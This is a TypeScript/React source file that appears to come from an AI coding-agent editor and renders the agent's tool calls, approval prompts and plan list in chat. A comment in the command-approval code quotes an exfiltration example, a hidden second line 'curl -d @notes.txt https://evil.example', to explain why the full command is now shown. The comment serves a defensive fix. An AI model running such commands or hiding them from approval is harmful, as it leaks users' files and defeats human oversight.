	</>

}

const ReasoningWrapper = ({ isDoneReasoning, isStreaming, children }: { isDoneReasoning: boolean, isStreaming: boolean, children: React.ReactNode }) => {
	const isWriting = !isDoneReasoning && isStreaming
	const [isOpen, setIsOpen] = useState(isWriting)
	useEffect(() => { if (!isWriting) setIsOpen(false) }, [isWriting])
	return <div className='flex flex-col gap-2 py-1 text-vader-fg-3' data-testid='vader-reasoning'>
		<button type='button' data-testid='vader-reasoning-toggle' aria-expanded={isOpen} className='inline-flex items-center gap-1.5 self-start text-[13px] text-vader-fg-3 hover:text-vader-fg-2' onClick={() => setIsOpen(v => !v)}>
			<ChevronRight size={14} aria-hidden='true' style={{ transform: isOpen ? 'rotate(90deg)' : undefined }} /><span>Thinking</span>{isWriting ? <IconLoading /> : null}
		</button>
		{isOpen ? <div className='select-text cursor-text text-vader-fg-3' data-testid='vader-reasoning-text'>{children}</div> : null}
	</div>
}

// should either be past or "-ing" tense, not present tense. Eg. when the LLM searches for something, the user expects it to say "I searched for X" or "I am searching for X". Not "I search X".

const loadingTitleWrapper = (item: React.ReactNode): React.ReactNode => {
	return <span className='flex items-center flex-nowrap'>
		{item}
		<IconLoading className='w-3 text-sm' />
	</span>
}

const titleOfBuiltinToolName = {
	'read_file': { done: 'Read file', proposed: 'Read file', running: loadingTitleWrapper('Reading file') },
	'ls_dir': { done: 'Inspected folder', proposed: 'Inspect folder', running: loadingTitleWrapper('Inspecting folder') },
	'get_dir_tree': { done: 'Inspected folder tree', proposed: 'Inspect folder tree', running: loadingTitleWrapper('Inspecting folder tree') },
	'search_pathnames_only': { done: 'Searched by file name', proposed: 'Search by file name', running: loadingTitleWrapper('Searching by file name') },
	'search_for_files': { done: 'Searched', proposed: 'Search', running: loadingTitleWrapper('Searching') },
	'create_file_or_folder': { done: `Created`, proposed: `Create`, running: loadingTitleWrapper(`Creating`) },
	'delete_file_or_folder': { done: `Deleted`, proposed: `Delete`, running: loadingTitleWrapper(`Deleting`) },
	'edit_file': { done: `Edited file`, proposed: 'Edit file', running: loadingTitleWrapper('Editing file') },
	'rewrite_file': { done: `Wrote file`, proposed: 'Write file', running: loadingTitleWrapper('Writing file') },
	'run_command': { done: `Ran terminal`, proposed: 'Run terminal', running: loadingTitleWrapper('Running terminal') },
	'run_persistent_command': { done: `Ran terminal`, proposed: 'Run terminal', running: loadingTitleWrapper('Running terminal') },

	'open_persistent_terminal': { done: `Opened terminal`, proposed: 'Open terminal', running: loadingTitleWrapper('Opening terminal') },
	'kill_persistent_terminal': { done: `Killed terminal`, proposed: 'Kill terminal', running: loadingTitleWrapper('Killing terminal') },

	'read_lint_errors': { done: `Read lint errors`, proposed: 'Read lint errors', running: loadingTitleWrapper('Reading lint errors') },
	'search_in_file': { done: 'Searched in file', proposed: 'Search in file', running: loadingTitleWrapper('Searching in file') },

	// Vader-added tools. These were missing, so any message about them failed to render at all (see GenericToolWrapper).
	'find_capability': { done: 'Looked for a capability', proposed: 'Look for a capability', running: loadingTitleWrapper('Looking for a capability') },
	'search_mcp_registry': { done: 'Searched the MCP registry', proposed: 'Search the MCP registry', running: loadingTitleWrapper('Searching the MCP registry') },
	'search_skillnet': { done: 'Searched SkillNet', proposed: 'Search SkillNet', running: loadingTitleWrapper('Searching SkillNet') },
	'fetch_skill_instructions': { done: 'Fetched skill instructions', proposed: 'Fetch skill instructions', running: loadingTitleWrapper('Fetching skill instructions') },
	'browser_new_page': { done: 'Opened browser page', proposed: 'Open browser page', running: loadingTitleWrapper('Opening browser page') },
	'browser_list_pages': { done: 'Listed browser pages', proposed: 'List browser pages', running: loadingTitleWrapper('Listing browser pages') },
	'browser_switch_page': { done: 'Switched browser page', proposed: 'Switch browser page', running: loadingTitleWrapper('Switching browser page') },
	'browser_close_page': { done: 'Closed browser page', proposed: 'Close browser page', running: loadingTitleWrapper('Closing browser page') },
	'browser_navigate': { done: 'Opened page in browser', proposed: 'Open page in browser', running: loadingTitleWrapper('Opening page in browser') },
	'browser_reload': { done: 'Reloaded page', proposed: 'Reload page', running: loadingTitleWrapper('Reloading page') },
	'browser_snapshot': { done: 'Read page', proposed: 'Read page', running: loadingTitleWrapper('Reading page') },
	'browser_click': { done: 'Clicked in page', proposed: 'Click in page', running: loadingTitleWrapper('Clicking in page') },
	'browser_type': { done: 'Typed in page', proposed: 'Type in page', running: loadingTitleWrapper('Typing in page') },
	'browser_screenshot': { done: 'Took screenshot', proposed: 'Take screenshot', running: loadingTitleWrapper('Taking screenshot') },
	'browser_screenshot_analyze': { done: 'Analyzed screenshot', proposed: 'Analyze screenshot', running: loadingTitleWrapper('Analyzing screenshot') },
	'browser_console_logs': { done: 'Read browser console', proposed: 'Read browser console', running: loadingTitleWrapper('Reading browser console') },
	'browser_page_errors': { done: 'Read page errors', proposed: 'Read page errors', running: loadingTitleWrapper('Reading page errors') },
	'browser_network_log': { done: 'Read network log', proposed: 'Read network log', running: loadingTitleWrapper('Reading network log') },
	'run_verification': { done: 'Ran project checks', proposed: 'Run project checks', running: loadingTitleWrapper('Running project checks') },
	'run_verification_agent': { done: 'Verified the work', proposed: 'Verify the work', running: loadingTitleWrapper('Verifying the work') },
	'create_persistent_agent': { done: 'Created agent', proposed: 'Create agent', running: loadingTitleWrapper('Creating agent') },
	'install_skill': { done: 'Installed skill', proposed: 'Install skill', running: loadingTitleWrapper('Installing skill') },
	'install_marketplace_capability': { done: 'Installed capability', proposed: 'Install capability', running: loadingTitleWrapper('Installing capability') },
	'remember': { done: 'Saved to memory', proposed: 'Save to memory', running: loadingTitleWrapper('Saving to memory') },
	'repo_map': { done: 'Mapped the project', proposed: 'Map the project', running: loadingTitleWrapper('Mapping the project') },
	'codebase_search': { done: 'Searched the project', proposed: 'Search the project', running: loadingTitleWrapper('Searching the project') },
	'await_terminal': { done: 'Waited for a terminal', proposed: 'Wait for a terminal', running: loadingTitleWrapper('Waiting for a terminal') },
	'update_task_list': { done: 'Updated the task list', proposed: 'Update the task list', running: loadingTitleWrapper('Updating the task list') },
	'delegate_parallel_tasks': { done: 'Ran parallel tasks', proposed: 'Run parallel tasks', running: loadingTitleWrapper('Running parallel tasks') },
	'delegate_subagent_task': { done: 'Delegated to subagent', proposed: 'Delegate to subagent', running: loadingTitleWrapper('Delegating to subagent') },
	'delegate_research_task': { done: 'Ran research task', proposed: 'Run research task', running: loadingTitleWrapper('Running research task') },
	'delegate_browser_task': { done: 'Ran browser task', proposed: 'Run browser task', running: loadingTitleWrapper('Running browser task') },
} as const satisfies Record<BuiltinToolName, { done: any, proposed: any, running: any }>


const getTitle = (toolMessage: Pick<ChatMessage & { role: 'tool' }, 'name' | 'type' | 'mcpServerName'>): React.ReactNode => {
	const t = toolMessage

	// non-built-in title
	if (!builtinToolNames.includes(t.name as BuiltinToolName)) {
		// descriptor of Running or Ran etc
		const descriptor =
			t.type === 'success' ? 'Called'
				: t.type === 'running_now' ? 'Calling'
					: t.type === 'tool_request' ? 'Call'
						: t.type === 'rejected' ? 'Call'
							: t.type === 'invalid_params' ? 'Call'
								: t.type === 'tool_error' ? 'Call'
									: 'Call'


		const title = `${descriptor} ${toolMessage.mcpServerName || 'MCP'}`
		if (t.type === 'running_now' || t.type === 'tool_request')
			return loadingTitleWrapper(title)
		return title
	}

	// built-in title
	else {
		const toolName = t.name as BuiltinToolName
		if (t.type === 'success') return titleOfBuiltinToolName[toolName].done
		if (t.type === 'running_now') return titleOfBuiltinToolName[toolName].running
		return titleOfBuiltinToolName[toolName].proposed
	}
}


const toolNameToDesc = (toolName: BuiltinToolName, _toolParams: BuiltinToolCallParams[BuiltinToolName] | undefined, accessor: ReturnType<typeof useAccessor>): {
	desc1: React.ReactNode,
	desc1Info?: string,
} => {

	if (!_toolParams) {
		return { desc1: '', };
	}

	const x = {
		'read_file': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['read_file']
			return {
				desc1: getBasename(toolParams.uri.fsPath),
				desc1Info: getRelative(toolParams.uri, accessor),
			};
		},
		'ls_dir': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['ls_dir']
			return {
				desc1: getFolderName(toolParams.uri.fsPath),
				desc1Info: getRelative(toolParams.uri, accessor),
			};
		},
		'search_pathnames_only': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['search_pathnames_only']
			return {
				desc1: `"${toolParams.query}"`,
			}
		},
		'search_for_files': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['search_for_files']
			return {
				desc1: `"${toolParams.query}"`,
			}
		},
		'search_in_file': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['search_in_file'];
			return {
				desc1: `"${toolParams.query}"`,
				desc1Info: getRelative(toolParams.uri, accessor),
			};
		},
		'create_file_or_folder': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['create_file_or_folder']
			return {
				desc1: toolParams.isFolder ? getFolderName(toolParams.uri.fsPath) ?? '/' : getBasename(toolParams.uri.fsPath),
				desc1Info: getRelative(toolParams.uri, accessor),
			}
		},
		'delete_file_or_folder': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['delete_file_or_folder']
			return {
				desc1: toolParams.isFolder ? getFolderName(toolParams.uri.fsPath) ?? '/' : getBasename(toolParams.uri.fsPath),
				desc1Info: getRelative(toolParams.uri, accessor),
			}
		},
		'rewrite_file': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['rewrite_file']
			return {
				desc1: getBasename(toolParams.uri.fsPath),
				desc1Info: getRelative(toolParams.uri, accessor),
			}
		},
		'edit_file': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['edit_file']
			return {
				desc1: getBasename(toolParams.uri.fsPath),
				desc1Info: getRelative(toolParams.uri, accessor),
			}
		},
		'run_command': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['run_command']
			return {
				desc1: `"${toolParams.command}"`,
			}
		},
		'run_persistent_command': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['run_persistent_command']
			return {
				desc1: `"${toolParams.command}"`,
			}
		},
		'open_persistent_terminal': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['open_persistent_terminal']
			return { desc1: '' }
		},
		'kill_persistent_terminal': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['kill_persistent_terminal']
			return { desc1: toolParams.persistentTerminalId }
		},
		'get_dir_tree': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['get_dir_tree']
			return {
				desc1: getFolderName(toolParams.uri.fsPath) ?? '/',
				desc1Info: getRelative(toolParams.uri, accessor),
			}
		},
		'read_lint_errors': () => {
			const toolParams = _toolParams as BuiltinToolCallParams['read_lint_errors']
			return {
				desc1: getBasename(toolParams.uri.fsPath),
				desc1Info: getRelative(toolParams.uri, accessor),
			}
		}
	}

	try {
		return (x as Record<string, (() => { desc1: React.ReactNode, desc1Info?: string }) | undefined>)[toolName]?.() || { desc1: '' }
	}
	catch {
		return { desc1: '' }
	}
}

/** the switch that makes a whole kind of action stop asking (Settings keeps the same one); not offered when the Policy Engine asked */
const AutoApproveToggle = ({ toolName }: { toolName: ToolName }) => {
	const approvalType = isABuiltinToolName(toolName) ? approvalTypeOfBuiltinToolName[toolName] : 'MCP tools'
	return approvalType ? <div key={approvalType} className="flex items-center ml-2 gap-x-1">
		<ToolApprovalTypeSwitch size='xs' approvalType={approvalType} desc={`Auto-approve ${approvalType}`} />
	</div> : null
}

export const ToolChildrenWrapper = ({ children, className }: { children: React.ReactNode, className?: string }) => {
	return <div className={`${className ? className : ''} cursor-default select-none`}>
		<div className='px-2 min-w-full overflow-hidden'>
			{children}
		</div>
	</div>
}
export const CodeChildren = ({ children, className }: { children: React.ReactNode, className?: string }) => {
	return <div className={`${className ?? ''} p-1 rounded-sm overflow-auto text-sm`}>
		<div className='!select-text cursor-auto'>
			{children}
		</div>
	</div>
}

export const ListableToolItem = ({ name, onClick, isSmall, className, showDot }: { name: React.ReactNode, onClick?: () => void, isSmall?: boolean, className?: string, showDot?: boolean }) => {
	return <div
		className={`
			${onClick ? 'hover:brightness-125 hover:cursor-pointer transition-all duration-200 ' : ''}
			flex items-center flex-nowrap whitespace-nowrap
			${className ? className : ''}
			`}
		onClick={onClick}
	>
		{showDot === false ? null : <div className="flex-shrink-0"><svg className="w-1 h-1 opacity-60 mr-1.5 fill-current" viewBox="0 0 100 40"><rect x="0" y="15" width="100" height="10" /></svg></div>}
		<div className={`${isSmall ? 'italic text-vader-fg-4 flex items-center' : ''}`}>{name}</div>
	</div>
}



const EditToolChildren = ({ uri, code, type }: { uri: URI | undefined, code: string, type: 'diff' | 'rewrite' }) => {

	const content = type === 'diff' ?
		<EditDiffLines uri={uri} searchReplaceBlocks={code} />
		: <ChatMarkdownRender string={`\`\`\`\n${code}\n\`\`\``} codeURI={uri} chatMessageLocation={undefined} />

	return <div className='!select-text cursor-auto'>
		<SmallProseWrapper>
			{content}
		</SmallProseWrapper>
	</div>

}


const LintErrorChildren = ({ lintErrors }: { lintErrors: LintErrorItem[] }) => {
	return <div className="text-xs text-vader-fg-4 opacity-80 border-l-2 border-vader-warning px-2 py-0.5 flex flex-col gap-0.5 overflow-x-auto whitespace-nowrap">
		{lintErrors.map((error, i) => (
			<div key={i}>Lines {error.startLineNumber}-{error.endLineNumber}: {error.message}</div>
		))}
	</div>
}

const BottomChildren = ({ children, title }: { children: React.ReactNode, title: string }) => {
	const [isOpen, setIsOpen] = useState(false);
	if (!children) return null;
	return (
		<div className="w-full px-2 mt-0.5">
			<div
				className={`flex items-center cursor-pointer select-none transition-colors duration-150 pl-0 py-0.5 rounded group`}
				onClick={() => setIsOpen(o => !o)}
				style={{ background: 'none' }}
			>
				<ChevronRight
					className={`mr-1 h-3 w-3 flex-shrink-0 transition-transform duration-100 text-vader-fg-4 group-hover:text-vader-fg-3 ${isOpen ? 'rotate-90' : ''}`}
				/>
				<span className="font-medium text-vader-fg-4 group-hover:text-vader-fg-3 text-xs">{title}</span>
			</div>
			<div
				className={`overflow-hidden transition-all duration-200 ease-in-out ${isOpen ? 'opacity-100' : 'max-h-0 opacity-0'} text-xs pl-4`}
			>
				<div className="overflow-x-auto text-vader-fg-4 opacity-90 border-l-2 border-vader-warning px-2 py-0.5">
					{children}
				</div>
			</div>
		</div>
	);
}


const EditToolHeaderButtons = ({ applyBoxId, uri, codeStr, toolName, threadId }: { threadId: string, applyBoxId: string, uri: URI, codeStr: string, toolName: 'edit_file' | 'rewrite_file' }) => {
	const { streamState } = useEditToolStreamState({ applyBoxId, uri })
	return <div className='flex items-center gap-1'>
		{/* <StatusIndicatorForApplyButton applyBoxId={applyBoxId} uri={uri} /> */}
		{/* <JumpToFileButton uri={uri} /> */}
		{streamState === 'idle-no-changes' && <CopyButton codeStr={codeStr} toolTipName='Copy' />}
		<EditToolAcceptRejectButtonsHTML type={toolName} codeStr={codeStr} applyBoxId={applyBoxId} uri={uri} threadId={threadId} />
	</div>
}



const InvalidTool = ({ toolName, message, mcpServerName }: { toolName: ToolName, message: string, mcpServerName: string | undefined }) => {
	const accessor = useAccessor()
	const title = getTitle({ name: toolName, type: 'invalid_params', mcpServerName })
	const desc1 = 'Invalid parameters'
	const icon = null
	const isError = true
	const componentParams: ToolHeaderParams = { title, desc1, isError, icon }

	componentParams.children = <ToolChildrenWrapper>
		<CodeChildren className='bg-vader-bg-3'>
			{message}
		</CodeChildren>
	</ToolChildrenWrapper>
	return <ToolHeaderWrapper {...componentParams} />
}

const CanceledTool = ({ toolName, mcpServerName }: { toolName: ToolName, mcpServerName: string | undefined }) => {
	const accessor = useAccessor()
	const title = getTitle({ name: toolName, type: 'rejected', mcpServerName })
	const desc1 = ''
	const icon = null
	const isRejected = true
	const componentParams: ToolHeaderParams = { title, desc1, icon, isRejected }
	return <ToolHeaderWrapper {...componentParams} />
}


const CommandTool = ({ toolMessage, type, threadId }: { threadId: string } & ({
	toolMessage: Exclude<ToolMessage<'run_command'>, { type: 'invalid_params' }>
	type: 'run_command'
} | {
	toolMessage: Exclude<ToolMessage<'run_persistent_command'>, { type: 'invalid_params' }>
	type: | 'run_persistent_command'
})) => {
	const accessor = useAccessor()

	const commandService = accessor.get('ICommandService')
	const terminalToolsService = accessor.get('ITerminalToolService')
	const toolsService = accessor.get('IToolsService')
	const isError = false
	const title = getTitle(toolMessage)
	const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
	const icon = null
	const streamState = useChatThreadsStreamState(threadId)

	const divRef = useRef<HTMLDivElement | null>(null)

	const isRejected = toolMessage.type === 'rejected'
	const { rawParams, params } = toolMessage
	const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }


	const effect = async () => {
		if (streamState?.isRunning !== 'tool') return
		if (type !== 'run_command' || toolMessage.type !== 'running_now') return;

		// wait for the interruptor so we know it's running

		await streamState?.interrupt
		const container = divRef.current;
		if (!container) return;

		const terminal = terminalToolsService.getTemporaryTerminal(toolMessage.params.terminalId);
		if (!terminal) return;

		try {
			terminal.attachToElement(container);
			terminal.setVisible(true)
		} catch {
		}

		// Listen for size changes of the container and keep the terminal layout in sync.
		const resizeObserver = new ResizeObserver((entries) => {
			const height = entries[0].borderBoxSize[0].blockSize;
			const width = entries[0].borderBoxSize[0].inlineSize;
			if (typeof terminal.layout === 'function') {
				terminal.layout({ width, height });
			}
		});

		resizeObserver.observe(container);
		return () => { terminal.detachFromElement(); resizeObserver?.disconnect(); }
	}

	useEffect(() => {
		effect()
	}, [terminalToolsService, toolMessage, toolMessage.type, type]);

	if (toolMessage.type === 'success') {
		const { result } = toolMessage

		// it's unclear that this is a button and not an icon.
		// componentParams.desc2 = <JumpToTerminalButton
		// 	onClick={() => { terminalToolsService.openTerminal(terminalId) }}
		// />

		let msg: string
		if (type === 'run_command') msg = toolsService.stringOfResult['run_command'](toolMessage.params, result)
		else msg = toolsService.stringOfResult['run_persistent_command'](toolMessage.params, result)

		if (type === 'run_persistent_command') {
			componentParams.info = persistentTerminalNameOfId(toolMessage.params.persistentTerminalId)
		}

		const fold = foldOutput(msg.trim())
		// how it ended (exit code and seconds) and, when long, how many lines (board S14)
		const end = type === 'run_command' ? commandEndWords((result as { resolveReason?: { type: string, exitCode?: number } }).resolveReason, toolMessage.durationMs) : { text: '', tone: 'plain' as const }
		if (end.text || fold.folded) componentParams.desc2 = <span data-testid='vader-command-end'>
			{end.text ? <span style={{ color: end.tone === 'ok' ? '#4cc38a' : end.tone === 'bad' ? '#f06a6e' : undefined }}>{end.text}</span> : null}
			{end.text && fold.folded ? ' · ' : null}
			{fold.folded ? lineCount(fold.total) : null}
		</span>
		componentParams.children = <ToolChildrenWrapper className='whitespace-pre text-nowrap overflow-auto text-sm'>
			<FoldedOutput full={msg.trim()} fold={fold} />
		</ToolChildrenWrapper>
	}
	else if (toolMessage.type === 'tool_error') {
		const { result } = toolMessage
		componentParams.bottomChildren = <BottomChildren title='Error'>
			<CodeChildren>
				{result}
			</CodeChildren>
		</BottomChildren>
	}
	else if (toolMessage.type === 'running_now') {
		if (type === 'run_command')
			componentParams.children = <div ref={divRef} className='relative h-[300px] text-sm' />
	}
	else if (toolMessage.type === 'rejected' || toolMessage.type === 'tool_request') {
		// What the user is asked to approve has to be visible IN FULL. The header is one clipped line, so a command with a second line (`echo harmless` then
		// `curl -d @notes.txt https://evil.example`) or a long padded one showed only "echo harmless curl…" and the rest ran unseen. Found by a probe of the real app.
		const fullCommand = String((params as { command?: unknown } | undefined)?.command ?? '')
		componentParams.desc1Info = fullCommand
		componentParams.children = <ToolChildrenWrapper className='whitespace-pre-wrap break-all overflow-auto text-sm max-h-[40vh]'>
			<div className='!select-text cursor-auto' data-testid='vader-command-full'>
				<pre className='m-0 px-2.5 py-2 rounded-md border border-vader-border-3 bg-vader-bg-3 text-vader-fg-1 whitespace-pre-wrap break-all' style={{ fontFamily: "'Cascadia Code','Cascadia Mono',Consolas,ui-monospace,monospace", fontSize: 12 }}>{fullCommand}</pre>
			</div>
		</ToolChildrenWrapper>
	}

	// a command that went quiet on a question: what it asked, and that the agent does not answer it (board S14)
	const waitingFor = toolMessage.type === 'success' ? (toolMessage.result as { resolveReason?: { type: string, waitingFor?: { prompt: string, secret: boolean } } }).resolveReason?.waitingFor : undefined

	return <>
		<ToolHeaderWrapper {...componentParams} isOpen={(type === 'run_command' && toolMessage.type === 'running_now') || toolMessage.type === 'tool_request' ? true : undefined} />
		{waitingFor ? <TerminalWaitingCard command={String((params as { command?: unknown } | undefined)?.command ?? '')} prompt={waitingFor} persistent={type === 'run_persistent_command'} onOpen={() => { void commandService.executeCommand('workbench.action.terminal.focus') }} /> : null}
	</>
}

type WrapperProps<T extends ToolName> = { toolMessage: Exclude<ToolMessage<T>, { type: 'invalid_params' }>, messageIdx: number, threadId: string }
const MCPToolWrapper = ({ toolMessage }: WrapperProps<string>) => {
	const accessor = useAccessor()
	const mcpService = accessor.get('IMCPService')

	const title = getTitle(toolMessage)
	const desc1 = removeMCPToolNamePrefix(toolMessage.name)
	const icon = null


	if (toolMessage.type === 'running_now') return null // do not show running

	const isError = false
	const isRejected = toolMessage.type === 'rejected'
	const { rawParams, params } = toolMessage
	const componentParams: ToolHeaderParams = { title, desc1, isError, icon, isRejected, }

	const paramsStr = JSON.stringify(params, null, 2)
	componentParams.desc2 = <CopyButton codeStr={paramsStr} toolTipName={`Copy inputs: ${paramsStr}`} />

	componentParams.info = !toolMessage.mcpServerName ? 'MCP tool not found' : undefined

	// Add copy inputs button in desc2


	if (toolMessage.type === 'success' || toolMessage.type === 'tool_request') {
		const { result } = toolMessage
		// while approval is pending there is no result yet: show what the tool would be CALLED with (the user was only given a copy button before)
		const resultStr = toolMessage.type === 'tool_request' ? paramsStr : (result ? mcpService.stringifyResult(result) : 'null')
		if (toolMessage.type === 'tool_request') { componentParams.isOpen = true }
		componentParams.children = <ToolChildrenWrapper>
			<SmallProseWrapper>
				<ChatMarkdownRender
					string={`\`\`\`json\n${resultStr}\n\`\`\``}
					chatMessageLocation={undefined}
					isApplyEnabled={false}
					isLinkDetectionEnabled={true}
				/>
			</SmallProseWrapper>
		</ToolChildrenWrapper>
	}
	else if (toolMessage.type === 'tool_error') {
		const { result } = toolMessage
		componentParams.bottomChildren = <BottomChildren title='Error'>
			<CodeChildren>
				{result}
			</CodeChildren>
		</BottomChildren>
	}

	return <ToolHeaderWrapper {...componentParams} />

}

type ResultWrapper<T extends ToolName> = (props: WrapperProps<T>) => React.ReactNode

// Vader fix. Only the tools Vader shipped had a chat component here; every tool Vader added (browser, subagents, memory,
// skills, verification, ...) rendered NOTHING - no header, no result and, worse, no Approve/Reject buttons, so an agent that
// needed approval for one of them waited forever on a request the user could not see (found by a live run). Any tool
// without a bespoke component now gets this one: title, the parameters (open while approval is pending, so the user sees
// what they are approving), and the result or error.
const GenericToolWrapper = ({ toolMessage }: WrapperProps<ToolName>) => {
	const title = getTitle(toolMessage)
	const isRejected = toolMessage.type === 'rejected'
	const isError = toolMessage.type === 'tool_error'
	const rawParams = (toolMessage.rawParams ?? {}) as Record<string, unknown>
	const paramsStr = JSON.stringify(rawParams, null, 2)
	const firstValue = Object.values(rawParams).find(v => typeof v === 'string' && v.length > 0) as string | undefined
	const desc1 = firstValue ? (firstValue.length > 70 ? firstValue.slice(0, 70) + '…' : firstValue) : ''

	const componentParams: ToolHeaderParams = { title, desc1, isError, icon: null, isRejected }
	componentParams.desc2 = <CopyButton codeStr={paramsStr} toolTipName={`Copy inputs: ${paramsStr}`} />

	const asCode = (str: string) => <ToolChildrenWrapper>
		<SmallProseWrapper>
			<ChatMarkdownRender
				string={`\`\`\`\n${str.length > 6000 ? str.slice(0, 6000) + '\n… (truncated)' : str}\n\`\`\``}
				chatMessageLocation={undefined}
				isApplyEnabled={false}
				isLinkDetectionEnabled={false}
			/>
		</SmallProseWrapper>
	</ToolChildrenWrapper>

	if (toolMessage.type === 'tool_request') {
		componentParams.children = asCode(paramsStr)
		componentParams.isOpen = true
	}
	else if (toolMessage.type === 'success' || toolMessage.type === 'rejected') {
		if (toolMessage.content) { componentParams.children = asCode(String(toolMessage.content)) }
	}
	else if (toolMessage.type === 'tool_error') {
		const errorText = String(toolMessage.content ?? toolMessage.result ?? '')
		// what the agent's browser said, in words (board S14); the real message is always under them
		const words = toolMessage.name.startsWith('browser_') ? explainBrowserError(errorText) : null
		componentParams.bottomChildren = <>
			{words ? <div className='flex flex-col gap-1 px-3 py-2.5 mt-1 rounded-lg border border-vader-border-2 bg-vader-bg-1' data-testid='vader-browser-error'>
				<span className='font-semibold text-vader-fg-1'>{words.title}</span>
				<span className='text-vader-fg-2 leading-relaxed'>{words.text}</span>
			</div> : null}
			<BottomChildren title='Error'>
				<CodeChildren>{errorText}</CodeChildren>
			</BottomChildren>
		</>
	}
	return <ToolHeaderWrapper {...componentParams} />
}

/** the mark of a step of the plan (board R01): done is a tick, the one being worked on turns, the rest wait as a ring */
const TaskMark = ({ status }: { status: string }) => status === 'done'
	? <svg width='14' height='14' viewBox='0 0 15 15' aria-label='Done'><path d='m3.4 7.7 2.5 2.4 5.2-5.4' fill='none' stroke='#8a8a91' strokeWidth='1.4' strokeLinecap='round' strokeLinejoin='round' /></svg>
	: status === 'in_progress'
		? <svg width='14' height='14' viewBox='0 0 14 14' aria-label='Working on it' className='motion-safe:animate-spin'><circle cx='7' cy='7' r='5' fill='none' stroke='rgba(255,255,255,.16)' strokeWidth='1.6' /><path d='M7 2a5 5 0 0 1 5 5' fill='none' stroke='#6ea0ff' strokeWidth='1.6' strokeLinecap='round' /></svg>
		: <svg width='14' height='14' viewBox='0 0 14 14' aria-label='To do'><circle cx='7' cy='7' r='4.4' fill='none' stroke='#6f6f76' strokeWidth='1.3' /></svg>

/** the agent's task list (board R01): "Plan 2 of 4" with each step marked; only the latest list is shown in full, an older one is a quiet line */
const PlanCard = ({ toolMessage, messageIdx, threadId }: WrapperProps<'update_task_list'>) => {
	const accessor = useAccessor()
	const chatThreadsService = accessor.get('IChatThreadService')
	if (toolMessage.type !== 'success') return <GenericToolWrapper toolMessage={toolMessage as never} messageIdx={messageIdx} threadId={threadId} />
	const msgs = chatThreadsService.state.allThreads[threadId]?.messages ?? []
	const isLatest = !msgs.slice(messageIdx + 1).some(m => m.role === 'tool' && m.name === 'update_task_list')
	const { done, total } = toolMessage.result
	if (!isLatest) return <ToolHeaderWrapper title='Updated the plan' desc1={`${done} of ${total}`} />
	const tasks = parseTaskList(toolMessage.result.text)
	return <div data-testid='vader-plan' className='flex flex-col gap-0.5'>
		<div className='flex items-center gap-2.5 h-6'><span className='font-semibold text-vader-fg-1'>Plan</span><span className='text-vader-fg-3'>{done} of {total}</span></div>
		{tasks.map((t, i) => <div key={i} data-status={t.status} className={`flex items-start gap-[9px] min-h-6 py-[3px] ${t.status === 'in_progress' ? 'text-vader-fg-1' : 'text-vader-fg-3'}`}>
			<span className='w-3.5 h-[18px] shrink-0 flex items-center'><TaskMark status={t.status} /></span>
			<span className='min-w-0 break-words'>{t.text}</span>
		</div>)}
	</div>
}

const builtinToolNameToComponent: Partial<{ [T in BuiltinToolName]: { resultWrapper: ResultWrapper<T>, } }> = {
	'update_task_list': { resultWrapper: PlanCard },
	'read_file': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')

			const title = getTitle(toolMessage)

			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor);
			const icon = null

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			let range: [number, number] | undefined = undefined
			if (toolMessage.params.startLine !== null || toolMessage.params.endLine !== null) {
				const start = toolMessage.params.startLine === null ? `1` : `${toolMessage.params.startLine}`
				const end = toolMessage.params.endLine === null ? `` : `${toolMessage.params.endLine}`
				const addStr = `(${start}-${end})`
				componentParams.desc1 += ` ${addStr}`
				range = [params.startLine || 1, params.endLine || 1]
			}

			if (toolMessage.type === 'success') {
				const { result } = toolMessage
				componentParams.onClick = () => { vaderOpenFileFn(params.uri, accessor, range) }
				if (result.hasNextPage && params.pageNumber === 1)  // first page
					componentParams.desc2 = `(truncated after ${Math.round(MAX_FILE_CHARS_PAGE) / 1000}k)`
				else if (params.pageNumber > 1) // subsequent pages
					componentParams.desc2 = `(part ${params.pageNumber})`
			}
			else if (toolMessage.type === 'tool_error') {
				const { result } = toolMessage
				// JumpToFileButton removed in favor of FileLinkText
				componentParams.bottomChildren = <BottomChildren title='Error'>
					<CodeChildren>
						{result}
					</CodeChildren>
				</BottomChildren>
			}

			return <ToolHeaderWrapper {...componentParams} />
		},
	},
	'get_dir_tree': {
		resultWrapper: ({ toolMessage }) => {
			const accessor = useAccessor()
			const commandService = accessor.get('ICommandService')

			const title = getTitle(toolMessage)
			const { desc1, desc1Info } = toolNameToDesc(toolMessage.name, toolMessage.params, accessor)
			const icon = null

			if (toolMessage.type === 'tool_request') return null // do not show past requests
			if (toolMessage.type === 'running_now') return null // do not show running

			const isError = false
			const isRejected = toolMessage.type === 'rejected'
			const { rawParams, params } = toolMessage
			const componentParams: ToolHeaderParams = { title, desc1, desc1Info, isError, icon, isRejected, }

			if (params.uri) {
				const rel = getRelative(params.uri, accessor)
				if (rel) componentParams.info = `Only search in ${rel}`
			}

			if (toolMessage.type === 'success') {
				const { result } = toolMessage
				componentParams.children = <ToolChildrenWrapper>
					<SmallProseWrapper>
						<ChatMarkdownRender
							string={`\`\`\`\n${result.str}\n\`\`\``}
							chatMessageLocation={undefined}
							isApplyEnabled={false}
							isLinkDetectionEnabled={true}
						/>
					</SmallProseWrapper>
